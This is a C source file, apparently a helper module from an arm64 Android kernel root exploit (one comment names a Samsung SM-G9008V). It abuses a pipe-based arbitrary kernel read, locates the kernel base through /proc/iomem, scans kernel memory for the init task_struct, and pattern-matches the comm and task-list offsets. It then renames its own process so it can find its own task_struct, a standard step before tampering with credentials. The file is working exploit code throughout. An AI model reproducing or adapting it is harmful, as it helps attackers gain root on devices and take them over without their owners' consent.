/*
 * util64.c
 *
 *  Created on: 2017-1-5
 *      Author: lizhongyuan
 */

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include "util64.h"

#define PF_KTHREAD	0x00200000	/* I am a kernel thread */

static unsigned long const kernel_start = 0xFFFFFFC000080000;
static unsigned long kernel_base = 0;
static int task_struct_comm_offset = 0;
static int task_struct_tasks_offset = 0; // default is 0x1D0 for SM-G9008V
static unsigned long kernel_task_struct = NULL;
static unsigned long current_task_struct = NULL;
static const char * const new_comm = "pvR_timewQ";
static unsigned long sysram = NULL;

struct thread_info {
	unsigned long		flags;		/* low level flags */
	unsigned long		addr_limit;	/* address limit */
	unsigned long		task;		/* main task structure */
	unsigned long		exec_domain;	/* execution domain */
	/* ... */
};

struct task_struct_first_partial {
	volatile long state;	/* -1 unrunnable, 0 runnable, >0 stopped */
	void *stack;
	int usage;
	unsigned int flags;	/* per process flags, defined below */
	// ...
};

static int read_at_address_pipe(void* address, void* buf, ssize_t len)
{
	int ret = 1;
	int pipes[2];

	if(pipe(pipes))
		return 1;

	if(write(pipes[1], address, len) != len)
		goto end;
	if(read(pipes[0], buf, len) != len)
		goto end;

	ret = 0;
end:
	close(pipes[1]);
	close(pipes[0]);
	return ret;
}

static int read_iomem() {
	FILE *iomem_file = NULL;
	char iomem_line[256] = { 0 };
	unsigned long iomem_start = 0;
	unsigned long iomem_end = 0;
	char colon[128] = { 0 };
	char desc0[128] = { 0 };
	char desc1[128] = { 0 };

	iomem_file = fopen("/proc/iomem", "rt");
	if(iomem_file == NULL) {
		kernel_base = kernel_start;
		return 1;
	}

	while(fgets(iomem_line, sizeof(iomem_line), iomem_file) != NULL) {
		if(sscanf(iomem_line, "%lx-%lx %s %s %s",
			&iomem_start, &iomem_end, colon, desc0, desc1) == 5) {

			if(strcmp(colon, ":") != 0) {
				continue;
			}

			if(sysram == 0) {
				if(strcasecmp(desc0, "System") == 0
					&& strcasecmp(desc1, "RAM") == 0) {
					sysram = iomem_end;
				}
			}

			if(strcasecmp(desc0, "Kernel") == 0 &&
				(strcasecmp(desc1, "text") == 0 || strcasecmp(desc1, "code") == 0)) {
				kernel_base = ((iomem_end+0x4000)&(~(0x4000UL-1))) - 0x80000000;
				kernel_base += 0xFFFFFFC000000000;
				printf("task search start address is 0x%016lX\n", (uint64_t)kernel_base);
				fclose(iomem_file);
				return 0;
			}
		}
	}

	return 1;
}

int init_utils64() {
	if(read_iomem() == 0) {
		prctl(PR_SET_NAME, new_comm);
		return 0;
	}
	return 1;
}

static int locate_task_struct_comm_offset() {
	int task_struct_length = 4000;
	int i = 0;
	char *comm_ptr = NULL;
	uint32_t comm0 = 0;
	uint32_t comm1 = 0;

	for(i=0;i<task_struct_length;i+=4) {
		comm_ptr = i + (char*)kernel_task_struct;
		if(0!=read_at_address_pipe(comm_ptr, &comm0, sizeof(comm0))) {
			continue;
		}
		if('paws' == comm0) {
			if(0!=read_at_address_pipe(comm_ptr+4, &comm1, sizeof(comm1))) {
				continue;
			}
			if('rep' == comm1 || '/rep' == comm1) {
				task_struct_comm_offset = i;
				printf("task_struc comm offset is 0x%04X\n", task_struct_comm_offset);
				return 0;
			}
		} else if('tini' == comm0) {
			task_struct_comm_offset = i;
			printf("task_struc comm offset is 0x%04X\n", task_struct_comm_offset);
			return 0;
		} else if('rhtk' == comm0) {
			if(0!=read_at_address_pipe(comm_ptr+4, &comm1, sizeof(comm1))) {
				continue;
			}
			if('ddae' == comm1) {
				task_struct_comm_offset = i;
				printf("task_struc comm offset is 0x%04X\n", task_struct_comm_offset);
				return 0;
			}
		}
	}

	return 1;
}

static int locate_task_struct_tasks_offset() {
	int task_struct_length = 4000;
	int i = 0;
	char *comm_ptr = NULL;
	unsigned long kptr0 = 0;
	unsigned long kptr1 = 0;
	int kmagic = 0;
	unsigned long kptr2 = 0;
	unsigned long kptr3 = 0;

	for(i=0;i<task_struct_length;i+=4) {
		comm_ptr = i + (char*)kernel_task_struct;
		if(0!=read_at_address_pipe(comm_ptr, &kptr0, sizeof(kptr0))) {
			continue;
		}
		if(kptr0 < kernel_start) {
			continue;
		}

		if(0!=read_at_address_pipe(comm_ptr+8, &kptr1, sizeof(kptr1))) {
			continue;
		}
		if(kptr1 < kernel_start) {
			continue;
		}

		if(0!=read_at_address_pipe(comm_ptr+16, &kmagic, sizeof(kmagic))) {
			continue;
		}
		if(kmagic != 0x0000008c) {
			continue;
		}

		if(0!=read_at_address_pipe(comm_ptr+24, &kptr2, sizeof(kptr2))) {
			continue;
		}
		if(kptr2 < kernel_start) {
			continue;
		}

		if(0!=read_at_address_pipe(comm_ptr+32, &kptr3, sizeof(kptr3))) {
			continue;
		}
		if(kptr3 < kernel_start) {
			continue;
		}

		task_struct_tasks_offset = i;
		printf("search tasks offset 0x%04X\n", task_struct_tasks_offset);
		return 0;
	}

	return 1;
}

static int locate_current_task_struct() {
	int total_tasks = 1000;
	int i = 0;
	char task_comm[16] = { 0 };
	char *next_task_struct = (char*)kernel_task_struct;
	char *task_struct_comm = NULL;
	char *next = NULL;

	for(i=0;i<total_tasks;i++) {
		if(0!=read_at_address_pipe(next_task_struct+task_struct_tasks_offset+8, &next, 8)) {
			return 1;
		}
		next -= task_struct_tasks_offset;
		if(next == (char*)kernel_task_struct) {
			return 1;
		}
		next_task_struct = next;
		task_struct_comm = next_task_struct + task_struct_comm_offset;

		memset(task_comm, 0, sizeof(task_comm));

		if(0!=read_at_address_pipe(task_struct_comm, &task_comm[0], 4)) {
			continue;
		}
		if(0!=read_at_address_pipe(task_struct_comm+4, &task_comm[4], 4)) {
			continue;
		}
		if(0!=read_at_address_pipe(task_struct_comm+8, &task_comm[8], 4)) {
			continue;
		}
		if(0!=read_at_address_pipe(task_struct_comm+12, &task_comm[12], 4)) {
			continue;
		}
		task_comm[15] = '\0';

		if(strcmp(task_comm, new_comm) == 0) {
			current_task_struct = (unsigned long)next_task_struct;
			printf("current task_struct at 0x%016lX\n", current_task_struct);
			return 0;
		}
	}

	return 1;
}

int new_search_task64() {
	struct thread_info *ti = NULL;
	int threadinfo_size = 0x4000;
	int search_length = 0xC000000;
	int i = 0;
	unsigned long addr_limit = -1;
	unsigned long exec_domain = 0;

	struct task_struct_first_partial *task_first = NULL;
	int usage = 0;
	unsigned int flags = 0;
	void *stack = 0;

	for(i=0; i<search_length; i+=threadinfo_size) {
		ti = (void*)(i + kernel_base);
		if(0!=read_at_address_pipe(&ti->addr_limit, &addr_limit, sizeof(addr_limit))) {
			continue;
		}
		if(-1UL==addr_limit) {
			continue;
		}
		if(0!=read_at_address_pipe(&ti->exec_domain, &exec_domain, sizeof(exec_domain))) {
			continue;
		}
		if(exec_domain < kernel_start) {
			continue;
		}
		if(0!=read_at_address_pipe(&ti->task, &task_first, sizeof(task_first))) {
			continue;
		}
		if((unsigned long)task_first < kernel_start) {
			continue;
		}
		if(0!=read_at_address_pipe(&task_first->usage, &usage, sizeof(usage))) {
			continue;
		}
		if(usage != 2) {
			continue;
		}
		if(0!=read_at_address_pipe(&task_first->flags, &flags, sizeof(flags))) {
			continue;
		}
		if(flags != PF_KTHREAD) {
			continue;
		}
		if(0!=read_at_address_pipe(&task_first->stack, &stack, sizeof(stack))) {
			continue;
		}
		if(stack != ti) {
			continue;
		}
		kernel_task_struct = (unsigned long)task_first;
		printf("kernel task_struct at 0x%016lX\n", kernel_task_struct);
		if(locate_task_struct_comm_offset() != 0) {
			continue;
		}
		if(locate_task_struct_tasks_offset() != 0) {
			continue;
		}

		if(locate_current_task_struct() == 0) {
			return 0;
		}
	}

	return 1;
}

unsigned long get_task_struct64() {
	return current_task_struct;
}
